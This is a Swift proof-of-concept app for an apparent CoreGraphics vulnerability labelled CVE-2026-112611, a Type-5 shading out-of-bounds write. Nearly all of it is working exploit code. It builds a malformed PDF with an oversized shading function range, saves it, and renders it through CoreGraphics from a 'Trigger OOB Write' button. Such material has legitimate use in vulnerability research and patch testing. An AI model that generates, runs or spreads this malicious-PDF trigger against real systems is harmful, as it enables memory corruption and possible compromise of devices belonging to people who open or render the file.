import SwiftUI
import CoreGraphics
import Foundation

// MARK: - PDF Payload Builder
enum PDFPayload {
    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
        let bpCoord = 32
        let bpComp = 8
        
        var bw = BitWriter()
        var verts: [(UInt32, UInt32)] = []
        
        for r in 0..<rows {
            for c in 0..<verticesPerRow {
                verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
            }
        }
        
        for (x, y) in verts {
            bw.put(x, bpCoord)
            bw.put(y, bpCoord)
            bw.put(0, bpComp)
        }
        
        let stream = bw.flush()
        let c = String(format: "%.17g", value)
        let list = Array(repeating: c, count: max(1, rangeDim)).joined(separator: " ")
        let rangeList = Array(repeating: "0 1", count: max(1, rangeDim)).joined(separator: " ")
        
        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 8 >>", Array(" /Sh1 sh".utf8))
        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow \(verticesPerRow) /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
        pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
        
        return pdf.data()
    }
}

struct BitWriter {
    private(set) var out: [UInt8] = []
    private var acc: UInt8 = 0
    private var nbits = 0
    
    mutating func put(_ value: UInt32, _ width: Int) {
        guard width > 0 else { return }
        for i in stride(from: width - 1, through: 0, by: -1) {
            acc = (acc << 1) | UInt8((value >> UInt32(i)) & 1)
            nbits += 1
            if nbits == 8 { out.append(acc); acc = 0; nbits = 0 }
        }
    }
    
    mutating func flush() -> [UInt8] {
        if nbits > 0 { out.append(acc << (8 - nbits)); acc = 0; nbits = 0 }
        return out
    }
}

struct PDFBuilder {
    private var objects: [Int: (dict: String, stream: [UInt8]?)] = [:]
    
    mutating func add(_ n: Int, _ dict: String, _ stream: [UInt8]? = nil) {
        objects[n] = (dict, stream)
    }
    
    func data() -> Data {
        var out = Data([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37, 0x0A])
        out.append(Data([0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A]))
        
        var offsets: [Int: Int] = [:]
        
        for n in objects.keys.sorted() {
            guard let obj = objects[n] else { continue }
            offsets[n] = out.count
            
            let header = "\(n) 0 obj\n"
            out.append(Data(header.utf8))
            
            out.append(Data(obj.dict.utf8))
            
            if let stream = obj.stream {
                out.append(Data("\nstream\n".utf8))
                out.append(Data(stream))
                out.append(Data("\nendstream".utf8))
            }
            
            out.append(Data("\nendobj\n".utf8))
        }
        
        let xrefPos = out.count
        let maxObj = objects.keys.max() ?? 0
        
        let xrefHeader = "xref\n0 \(maxObj + 1)\n0000000000 65535 f \n"
        out.append(Data(xrefHeader.utf8))
        
        for n in 1...max(maxObj, 1) {
            let off = offsets[n] ?? 0
            let line = String(format: "%010d 00000 n \n", off)
            out.append(Data(line.utf8))
        }
        
        let trailer = "trailer\n<< /Size \(maxObj + 1) /Root 1 0 R >>\nstartxref\n\(xrefPos)\n%%EOF\n"
        out.append(Data(trailer.utf8))
        
        return out
    }
}

// MARK: - Main View
struct ContentView: View {
    @State private var status = "Ready to trigger CVE-2026-112611"
    @State private var isTriggering = false
    
    var body: some View {
        VStack(spacing: 30) {
            Text("CVE-2026-112611")
                .font(.largeTitle)
                .bold()
            
            Text("CoreGraphics Type-5 Shading OOB")
                .font(.headline)
            
            Text(status)
                .font(.system(.body, design: .monospaced))
                .foregroundColor(.secondary)
                .padding()
                .multilineTextAlignment(.center)
            
            Button(action: triggerBug) {
                Text(isTriggering ? "Triggering..." : "Trigger OOB Write")
                    .font(.title2)
                    .bold()
                    .foregroundColor(.white)
                    .padding()
                    .background(isTriggering ? Color.gray : Color.red)
                    .cornerRadius(10)
            }
            .disabled(isTriggering)
        }
        .padding()
    }
    
    func triggerBug() {
        isTriggering = true
        status = "Generating malicious PDF..."
        
        let pdfData = PDFPayload.shading(
            rangeDim: 136,
            value: 1.0,
            verticesPerRow: 2,
            rows: 2
        )
        
        status = "Writing to temp file..."
        
        let tempURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("trigger.pdf")
        
        do {
            try pdfData.write(to: tempURL)
        } catch {
            status = "ERROR: Write failed"
            isTriggering = false
            return
        }
        
        status = "Rendering with CoreGraphics..."
        
        guard let provider = CGDataProvider(url: tempURL as CFURL) else {
            status = "ERROR: No data provider"
            isTriggering = false
            return
        }
        
        guard let doc = CGPDFDocument(provider) else {
            status = "ERROR: No PDF document"
            isTriggering = false
            return
        }
        
        guard let page = doc.page(at: 1) else {
            status = "ERROR: No page 1"
            isTriggering = false
            return
        }
        
        guard let context = CGContext(data: nil, width: 256, height: 256,
                                      bitsPerComponent: 8, bytesPerRow: 256 * 4,
                                      space: CGColorSpaceCreateDeviceRGB(),
                                      bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
            status = "ERROR: No context"
            isTriggering = false
            return
        }
        
        context.drawPDFPage(page)
        
        status = "Rendered (check for crash)"
        isTriggering = false
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
